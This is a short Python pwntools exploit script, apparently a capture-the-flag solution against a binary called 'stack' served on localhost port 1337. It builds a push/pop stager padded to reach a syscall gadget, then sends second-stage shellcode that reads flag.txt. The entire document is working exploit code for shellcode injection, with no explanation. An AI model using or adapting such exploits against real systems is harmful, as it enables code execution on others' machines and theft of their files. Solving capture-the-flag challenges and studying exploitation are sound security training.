from pwn import *
elf = ELF("stack")
context.log_level = "debug"
context.binary = elf

s = asm(f"""
/* rsi = rdx */
push rdx
pop rsi
/* dummy */
pop rbx
/* grab len on stack */
pop rdx
/* dummy */
pop rbx
pop rbx
pop rbx
/* grab 0 on stack */
pop rax
/* rdi = rax = 0 */
push rax
pop rdi
/* rsp = rsi */
push rsi
pop rsp
/* padding */
pop rbx
pop rbx
pop rbx
push rdx
""")
syscall = 0x050f
push_rbx = b"\x53"
padding = syscall - len(s)
payload = s.ljust(syscall, push_rbx)

shell = asm("add rsp, 200\n" + shellcraft.cat("flag.txt"))
p = remote("localhost", 1337)
p.send(payload)
pause()
p.send((len(s) + 2) * b"A" + shell)
print(p.recvlineS())
